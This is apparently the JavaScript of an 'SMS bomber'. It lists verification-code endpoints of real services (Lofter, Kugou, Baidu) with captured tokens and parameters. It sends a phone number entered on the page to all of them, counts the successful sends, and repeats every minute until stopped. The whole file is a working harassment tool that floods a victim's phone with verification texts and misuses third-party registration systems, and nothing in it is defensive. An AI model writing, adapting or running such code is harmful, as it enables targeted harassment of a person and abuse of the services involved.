var api = [
    ['https://www.lofter.com/lpt/getCaptcha.do?clientType=0&deviceType=pc', 'phone'],
    ['https://login-user.kugou.com/v1/send_sms_for_reg?appid=1014&callback=GetSmsCodeCallbackFn&v=1&verifycode=gz8y&ct=1538017439&type=reg&mid=48d3716067cb85edb2db4557451eaa75&kguser_jv=180925', '&mobile'],
    ['https://passport.baidu.com/v2/?regphonesend&token=c621a0765b7c260f2af01b50d5aecb5b&tpl=mn&subpro=&apiver=v3&tt=1538018219774&is_voice_sms=0&countrycode=&isexchangeable=1&confirmverifycode=%E4%B8%BA%E4%BD%95&vcodesign=707621d894&dv=tk0.54155542079777461538018167737%40aaf0TBvsJB2my6F6a4630tuVjF6VhM2VjMHutLJ3aIPp6B2s2~tsIw2sqyokqB9r0vGV8hs9jM60tFuitMu~9iKu8vCpVLokrivk3SMk3~okqB9r0vGV8hs9jM60tFuitMu~9iKu8vCpVLokrS2kqiMkrzokqB9r0vGV8hs9jM60tFuitMu~9iKu8vCpVLokrS2OCxMkrl2Allo0Ghs3HAF6VMuVhs60wiuVjVJz9dsX0ZKAlytk6i2ul_vf0Sv2srS2mlyti7B2iJzvAy6F6a4630tuVjF6VhM2VjMHutLJ3aIPp9uJX0lJn9dMkrd2iJB2O7Sok6Vtk7BMkryvk7B2O2xokJivkJBMkCS2dld2sJBvkFitAy6F6a4630tuVjF6VhM2VjMJnIEPX9wtO2aok7xtdld2i6xt1y6F6a4630tuVjF6VhM2VjMJn0iJ~HEJXGwBssN-sx~ZrcPhxfh2AldokCaEfLHnBloO6S2s6VtsFd2kJatiJ~tkCyts2x2krx2sC~ti2~Afc2mllokra2k2BtO2~okra2OqB2sqx2mlyvs7lokra2OqB2sqS2q__&vcodestr=jxGe507e22358c8c1c902eb15599801637b3abe44066f0431a8&traceid=', 'phone'],
];

var time, count = 0;
function ready(link, phoneNum) {
    var phone = $('#phoneNum').val();
    var url = link+'&'+phoneNum+'='+phone;
    $.ajax(url, {
        dataType: 'jsonp',
        crossDomain: true,
        success: function (data) {
            if(data.status === 200) {
                count = count + 1;
                $('#boomNum').text(count);
            }
        }
    })
}
function boom() {
    clearInterval(time);
    $('#boomType').text('正在进行中');
    $(function ($) {
        for(var i = 0; i < api.length; i ++) {
            ready(api[i][0], api[i][1]);
        }
    });
    time = setInterval("boom()", 60000);
}
function stop() {
    clearInterval(time);
    $('#boomType').text('已停止');
}
